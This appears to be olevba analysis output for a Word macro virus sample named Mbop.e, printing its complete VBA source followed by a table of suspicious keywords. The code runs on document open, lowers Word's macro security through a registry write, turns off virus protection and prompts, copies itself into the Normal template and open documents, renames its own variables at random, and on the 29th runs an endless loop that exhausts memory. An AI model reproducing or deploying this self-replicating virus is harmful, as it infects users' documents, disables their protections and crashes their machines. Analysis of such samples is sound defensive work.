olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.e-eb25a50d46e1077726795af31bfd121dd4b31eb1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.e-eb25a50d46e1077726795af31bfd121dd4b31eb1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
wqavryduuohvgmthhwqavryduuohvgmt = 1
wqavryduuohvgmtl1wqavryduuohvgmt = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
wqavryduuohvgmtfiwqavryduuohvgmt = 1
Options.ConfirmConversions = False
Set wqavryduuohvgmtNtwqavryduuohvgmt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
wqavryduuohvgmt11wqavryduuohvgmt = 1
Set wqavryduuohvgmtAdwqavryduuohvgmt = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
wqavryduuohvgmtsewqavryduuohvgmt = 3
Set wqavryduuohvgmtTdwqavryduuohvgmt = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
wqavryduuohvgmttrwqavryduuohvgmt = 3
wqavryduuohvgmtl2wqavryduuohvgmt = "b"
wqavryduuohvgmtfnwqavryduuohvgmt = wqavryduuohvgmtfiwqavryduuohvgmt & wqavryduuohvgmtsewqavryduuohvgmt & wqavryduuohvgmttrwqavryduuohvgmt
For wqavryduuohvgmtiiwqavryduuohvgmt = 1 To wqavryduuohvgmtTdwqavryduuohvgmt.countoflines
If InStr(wqavryduuohvgmtTdwqavryduuohvgmt.lines(wqavryduuohvgmtiiwqavryduuohvgmt, 1), "Private Sub Document_Open()") <> 0 Then
wqavryduuohvgmtSlwqavryduuohvgmt = wqavryduuohvgmtiiwqavryduuohvgmt
Exit For
End If
Next
wqavryduuohvgmtl3wqavryduuohvgmt = "o"
wqavryduuohvgmtVcwqavryduuohvgmt = Trim(wqavryduuohvgmtTdwqavryduuohvgmt.lines(wqavryduuohvgmtSlwqavryduuohvgmt, wqavryduuohvgmtSlwqavryduuohvgmt + wqavryduuohvgmtfnwqavryduuohvgmt))
wqavryduuohvgmtlvwqavryduuohvgmt = 97
wqavryduuohvgmt15wqavryduuohvgmt = 15
If wqavryduuohvgmtNtwqavryduuohvgmt.countoflines > 0 Then
wqavryduuohvgmtNlwqavryduuohvgmt = wqavryduuohvgmtNtwqavryduuohvgmt.lines(1, wqavryduuohvgmtNtwqavryduuohvgmt.countoflines)
If InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Nt") = 0 And InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Sl") = 0 And InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Nl") = 0 And InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Ad") = 0 And InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Vc") = 0 And InStr(wqavryduuohvgmtNlwqavryduuohvgmt, "Td") = 0 Then
If InStr(LCase(wqavryduuohvgmtNlwqavryduuohvgmt), "private sub document_open()") <> 0 Then
For wqavryduuohvgmtiwqavryduuohvgmt = 1 To wqavryduuohvgmtNtwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtNtwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "private sub document_open()") <> 0 Then
wqavryduuohvgmtnswqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
For wqavryduuohvgmtiwqavryduuohvgmt = wqavryduuohvgmtnswqavryduuohvgmt To wqavryduuohvgmtNtwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtNtwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "end sub") <> 0 Then
wqavryduuohvgmtnewqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
wqavryduuohvgmtNtwqavryduuohvgmt.deletelines wqavryduuohvgmtnswqavryduuohvgmt, wqavryduuohvgmtnewqavryduuohvgmt
End If
If InStr(LCase(wqavryduuohvgmtNlwqavryduuohvgmt), "option explicit") <> 0 Then
For wqavryduuohvgmtiwqavryduuohvgmt = 1 To wqavryduuohvgmtNtwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtNtwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "option explicit") <> 0 Then
wqavryduuohvgmtnswqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
wqavryduuohvgmtNtwqavryduuohvgmt.deletelines wqavryduuohvgmtnswqavryduuohvgmt, 1
End If
wqavryduuohvgmtNtwqavryduuohvgmt.addfromstring wqavryduuohvgmtVcwqavryduuohvgmt
wqavryduuohvgmtNtwqavryduuohvgmt.Save
wqavryduuohvgmtinwqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt
End If
Else
wqavryduuohvgmtNtwqavryduuohvgmt.addfromstring wqavryduuohvgmtVcwqavryduuohvgmt
wqavryduuohvgmtNtwqavryduuohvgmt.Save
wqavryduuohvgmtinwqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt
End If
wqavryduuohvgmthvwqavryduuohvgmt = 122
wqavryduuohvgmtiwqavryduuohvgmt = 1
wqavryduuohvgmtdqwqavryduuohvgmt = Documents.Count
If wqavryduuohvgmtAdwqavryduuohvgmt.countoflines > 0 Then
wqavryduuohvgmtAlwqavryduuohvgmt = wqavryduuohvgmtAdwqavryduuohvgmt.lines(1, wqavryduuohvgmtAdwqavryduuohvgmt.countoflines)
If InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Nt") = 0 And InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Sl") = 0 And InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Nl") = 0 And InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Ad") = 0 And InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Vc") = 0 And InStr(wqavryduuohvgmtAlwqavryduuohvgmt, "Td") = 0 Then
If InStr(LCase(wqavryduuohvgmtAlwqavryduuohvgmt), "private sub document_open()") <> 0 Then
For wqavryduuohvgmtiwqavryduuohvgmt = 1 To wqavryduuohvgmtAdwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtAdwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "private sub document_open()") <> 0 Then
wqavryduuohvgmtnswqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
For wqavryduuohvgmtiwqavryduuohvgmt = wqavryduuohvgmtnswqavryduuohvgmt To wqavryduuohvgmtAdwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtAdwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "end sub") <> 0 Then
wqavryduuohvgmtnewqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
wqavryduuohvgmtAdwqavryduuohvgmt.deletelines wqavryduuohvgmtnswqavryduuohvgmt, wqavryduuohvgmtnewqavryduuohvgmt
End If
If InStr(LCase(wqavryduuohvgmtAlwqavryduuohvgmt), "option explicit") <> 0 Then
For wqavryduuohvgmtiwqavryduuohvgmt = 1 To wqavryduuohvgmtAdwqavryduuohvgmt.countoflines
If InStr(LCase(wqavryduuohvgmtAdwqavryduuohvgmt.lines(wqavryduuohvgmtiwqavryduuohvgmt, 1)), "option explicit") <> 0 Then
wqavryduuohvgmtnswqavryduuohvgmt = wqavryduuohvgmtiwqavryduuohvgmt
Exit For
End If
Next
wqavryduuohvgmtAdwqavryduuohvgmt.deletelines wqavryduuohvgmtnswqavryduuohvgmt, 1
End If
wqavryduuohvgmtAdwqavryduuohvgmt.addfromstring wqavryduuohvgmtVcwqavryduuohvgmt
wqavryduuohvgmtiawqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt
End If
Else
wqavryduuohvgmtAdwqavryduuohvgmt.addfromstring wqavryduuohvgmtVcwqavryduuohvgmt
wqavryduuohvgmtiawqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt
End If
wqavryduuohvgmtl4wqavryduuohvgmt = "p"
Randomize
wqavryduuohvgmt15wqavryduuohvgmt = Int((wqavryduuohvgmt15wqavryduuohvgmt - wqavryduuohvgmt11wqavryduuohvgmt + wqavryduuohvgmt11wqavryduuohvgmt) * Rnd + wqavryduuohvgmt11wqavryduuohvgmt)
For wqavryduuohvgmtiiwqavryduuohvgmt = 1 To wqavryduuohvgmt15wqavryduuohvgmt
Randomize
wqavryduuohvgmtTnwqavryduuohvgmt = wqavryduuohvgmtTnwqavryduuohvgmt & Chr(Int((wqavryduuohvgmthvwqavryduuohvgmt - wqavryduuohvgmtlvwqavryduuohvgmt + 1) * Rnd + wqavryduuohvgmtlvwqavryduuohvgmt))
Next
wqavryduuohvgmtd2wqavryduuohvgmt = 9
wqavryduuohvgmtVcwqavryduuohvgmt = wqavryduuohvgmtTdwqavryduuohvgmt.lines(1, wqavryduuohvgmtTdwqavryduuohvgmt.countoflines)
wqavryduuohvgmtTdwqavryduuohvgmt.deletelines 1, wqavryduuohvgmtTdwqavryduuohvgmt.countoflines
Do While InStr(wqavryduuohvgmtVcwqavryduuohvgmt, "wqavryduuohvgmt") <> 0
wqavryduuohvgmtVcwqavryduuohvgmt = Mid(wqavryduuohvgmtVcwqavryduuohvgmt, 1, InStr(wqavryduuohvgmtVcwqavryduuohvgmt, "wqavryduuohvgmt") - 1) & wqavryduuohvgmtTnwqavryduuohvgmt & Mid(wqavryduuohvgmtVcwqavryduuohvgmt, InStr(wqavryduuohvgmtVcwqavryduuohvgmt, "wqavryduuohvgmt") + Len("wqavryduuohvgmt"))
Loop
wqavryduuohvgmtTdwqavryduuohvgmt.addfromstring wqavryduuohvgmtVcwqavryduuohvgmt
wqavryduuohvgmtdywqavryduuohvgmt = Day(Now)
wqavryduuohvgmtd1wqavryduuohvgmt = 2
wqavryduuohvgmtl5wqavryduuohvgmt = "!"
If wqavryduuohvgmtdywqavryduuohvgmt = wqavryduuohvgmtd1wqavryduuohvgmt & wqavryduuohvgmtd2wqavryduuohvgmt Then
Dim wqavryduuohvgmtstwqavryduuohvgmt()
wqavryduuohvgmtcawqavryduuohvgmt = 0
Do
ReDim Preserve wqavryduuohvgmtstwqavryduuohvgmt(wqavryduuohvgmtcawqavryduuohvgmt)
wqavryduuohvgmtqwwqavryduuohvgmt = CLng(1024)
wqavryduuohvgmtqawqavryduuohvgmt = wqavryduuohvgmtqwwqavryduuohvgmt
wqavryduuohvgmtqzwqavryduuohvgmt = wqavryduuohvgmtqwwqavryduuohvgmt * wqavryduuohvgmtqawqavryduuohvgmt
wqavryduuohvgmtstwqavryduuohvgmt(wqavryduuohvgmtcawqavryduuohvgmt) = String(wqavryduuohvgmtqzwqavryduuohvgmt, Right(wqavryduuohvgmtTnwqavryduuohvgmt, 1))
DoEvents
wqavryduuohvgmtcawqavryduuohvgmt = wqavryduuohvgmtcawqavryduuohvgmt + 1
Loop
End If
If wqavryduuohvgmtiawqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt Or wqavryduuohvgmtinwqavryduuohvgmt = wqavryduuohvgmthhwqavryduuohvgmt Then
MsgBox wqavryduuohvgmtl1wqavryduuohvgmt & wqavryduuohvgmtl2wqavryduuohvgmt & wqavryduuohvgmtl3wqavryduuohvgmt & wqavryduuohvgmtl4wqavryduuohvgmt & wqavryduuohvgmtl5wqavryduuohvgmt, vbCritical
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

